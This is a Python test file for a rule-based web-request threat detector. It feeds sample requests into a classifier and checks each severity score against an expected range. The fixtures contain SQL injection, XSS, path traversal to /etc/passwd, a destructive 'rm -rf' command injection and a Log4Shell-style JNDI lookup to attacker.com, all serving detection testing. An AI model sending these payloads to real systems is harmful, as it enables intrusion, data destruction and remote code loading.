# test_tier1_rules.py - Test Phase 2 Tier 1 (Rules)
"""
Tests for rules.py - Static signatures and anomaly detection
Run: python test_tier1_rules.py
"""
import os
import json
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from phase2.rules import SecurityRules


class TestCases:
    """Collection of test requests"""
    
    # Normal requests (should pass - severity 0-3)
    NORMAL_GET = {
        'method': 'GET',
        'path': 'health',
        'request_body_preview': '',
        'headers': {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'},
        'client_ip': '127.0.0.1',
        'response_status': 200,
        'response_size': 398,
        'response_time_ms': 10.5
    }
    
    # SQL Injection
    SQLI_OR = {
        'method': 'POST',
        'path': 'api/users',
        'request_body_preview': "{'id': ' OR '1'='1', 'name': 'test'}",
        'headers': {'user-agent': 'Mozilla/5.0'},
        'client_ip': '203.0.113.45',
        'response_status': 200,
        'response_size': 492,
        'response_time_ms': 45.2
    }
    
    # SQL Injection - UNION SELECT
    SQLI_UNION = {
        'method': 'POST',
        'path': 'api/search',
        'request_body_preview': "query: UNION SELECT password FROM users",
        'headers': {'user-agent': 'sqlmap/1.0'},
        'client_ip': '198.51.100.89',
        'response_status': 200,
        'response_size': 892,
        'response_time_ms': 125.3
    }
    
    # XSS Attack
    XSS_SCRIPT = {
        'method': 'POST',
        'path': 'api/comment',
        'request_body_preview': "text: <script>alert('XSS')</script>",
        'headers': {'user-agent': 'Mozilla/5.0'},
        'client_ip': '192.0.2.50',
        'response_status': 200,
        'response_size': 198,
        'response_time_ms': 22.1
    }
    
    # Command Injection
    CMD_INJECTION = {
        'method': 'POST',
        'path': 'api/execute',
        'request_body_preview': "cmd: ; rm -rf /etc/passwd",
        'headers': {'user-agent': 'Mozilla/5.0'},
        'client_ip': '203.0.113.100',
        'response_status': 200,
        'response_size': 152,
        'response_time_ms': 18.5
    }
    
    # LDAP Injection (Log4Shell-like)
    LDAP_INJECTION = {
        'method': 'POST',
        'path': 'api/process',
        'request_body_preview': "${jndi:ldap://attacker.com/a}",
        'headers': {'user-agent': 'Mozilla/5.0'},
        'client_ip': '203.0.113.45',
        'response_status': 200,
        'response_size': 245,
        'response_time_ms': 32.2
    }
    
    # Path Traversal
    PATH_TRAVERSAL = {
        'method': 'GET',
        'path': 'api/file?path=../../../etc/passwd',
        'request_body_preview': '',
        'headers': {'user-agent': 'Mozilla/5.0'},
        'client_ip': '203.0.113.200',
        'response_status': 200,
        'response_size': 1024,
        'response_time_ms': 15.2
    }
    
    # Anomaly: Missing User-Agent
    MISSING_UA = {
        'method': 'GET',
        'path': 'api/data',
        'request_body_preview': '',
        'headers': {'user-agent': None},
        'client_ip': '203.0.113.75',
        'response_status': 200,
        'response_size': 512,
        'response_time_ms': 12.0
    }
    
    # Anomaly: Scanner User-Agent
    SCANNER_UA = {
        'method': 'GET',
        'path': 'api/test',
        'request_body_preview': '',
        'headers': {'user-agent': 'sqlmap/1.0 (http://sqlmap.org)'},
        'client_ip': '203.0.113.85',
        'response_status': 200,
        'response_size': 234,
        'response_time_ms': 18.5
    }
    
    # Anomaly: Large response (potential data exfiltration)
    LARGE_RESPONSE = {
        'method': 'GET',
        'path': 'api/export',
        'request_body_preview': '',
        'headers': {'user-agent': 'Mozilla/5.0'},
        'client_ip': '203.0.113.99',
        'response_status': 200,
        'response_size': 1048576,  # 1MB
        'response_time_ms': 3000.0
    }
    
    # Anomaly: Slow response (potential DoS or backend issue)
    SLOW_RESPONSE = {
        'method': 'POST',
        'path': 'api/processing',
        'request_body_preview': '{"data": "test"}',
        'headers': {'user-agent': 'Mozilla/5.0'},
        'client_ip': '203.0.113.88',
        'response_status': 200,
        'response_size': 245,
        'response_time_ms': 7500.0  # 7.5 seconds
    }


def print_test_result(test_name, request_data, result):
    """Pretty print test result"""
    severity = result['severity']
    category = result['category']
    requires_ai = result.get('requires_ai', False)
    
    # Color coding
    if severity == 0:
        status = "✅ PASS"
    elif severity >= 8:
        status = "🚨 HIGH THREAT"
    elif severity >= 4:
        status = "⚠️ SUSPICIOUS"
    else:
        status = "📋 NORMAL"
    
    print(f"\n{'='*70}")
    print(f"Test: {test_name}")
    print(f"{'='*70}")
    print(f"Status:               {status}")
    print(f"Severity:             {severity}/10")
    print(f"Category:             {category}")
    print(f"Requires AI Analysis: {requires_ai}")
    print(f"Path:                 {request_data.get('path', 'N/A')}")
    print(f"Method:               {request_data.get('method', 'N/A')}")
    print(f"Client IP:            {request_data.get('client_ip', 'N/A')}")
    
    if result['triggered_rules']:
        print(f"\nTriggered Rules:")
        for rule in result['triggered_rules'][:5]:  # Show first 5
            print(f"  - {rule}")
        if len(result['triggered_rules']) > 5:
            print(f"  ... and {len(result['triggered_rules']) - 5} more")
    
    print(f"\nReason: {result['reason']}")


def run_tests():
    """Run all test cases"""
    print("\n" + "="*70)
    print("PHASE 2 - TIER 1 (RULES) TESTING")
    print("="*70)
    
    tests = [
        ("Normal GET Request", TestCases.NORMAL_GET, 0, 3),
        ("SQL Injection: OR", TestCases.SQLI_OR, 7, 10),
        ("SQL Injection: UNION", TestCases.SQLI_UNION, 7, 10),
        ("XSS Attack", TestCases.XSS_SCRIPT, 7, 10),
        ("Command Injection", TestCases.CMD_INJECTION, 7, 10),
        ("LDAP Injection", TestCases.LDAP_INJECTION, 7, 10),
        ("Path Traversal", TestCases.PATH_TRAVERSAL, 4, 10),
        ("Anomaly: Missing User-Agent", TestCases.MISSING_UA, 1, 4),
        ("Anomaly: Scanner User-Agent", TestCases.SCANNER_UA, 3, 7),
        ("Anomaly: Large Response", TestCases.LARGE_RESPONSE, 2, 5),
        ("Anomaly: Slow Response", TestCases.SLOW_RESPONSE, 1, 5),
    ]
    
    passed = 0
    failed = 0
    results_summary = []
    
    for test_name, request_data, expected_min, expected_max in tests:
        result = SecurityRules.analyze(request_data)
        severity = result['severity']
        
        # Check if severity is in expected range
        is_pass = expected_min <= severity <= expected_max
        
        print_test_result(test_name, request_data, result)
        
        if is_pass:
            print(f"✅ PASS: Severity {severity} is in range [{expected_min}-{expected_max}]")
            passed += 1
        else:
            print(f"❌ FAIL: Severity {severity} is NOT in range [{expected_min}-{expected_max}]")
            failed += 1
        
        results_summary.append({
            'test': test_name,
            'severity': severity,
            'expected_range': f"[{expected_min}-{expected_max}]",
            'passed': is_pass
        })
    
    # Summary
    print("\n" + "="*70)
    print("SUMMARY")
    print("="*70)
    print(f"Total Tests:   {len(tests)}")
    print(f"Passed:        {passed} ✅")
    print(f"Failed:        {failed} ❌")
    print(f"Success Rate:  {(passed/len(tests)*100):.1f}%")
    
    if failed == 0:
        print("\n🎉 ALL TIER 1 TESTS PASSED!")
    else:
        print(f"\n⚠️  {failed} tests failed. Details above.")
    
    return failed == 0


if __name__ == '__main__':
    success = run_tests()
    sys.exit(0 if success else 1)
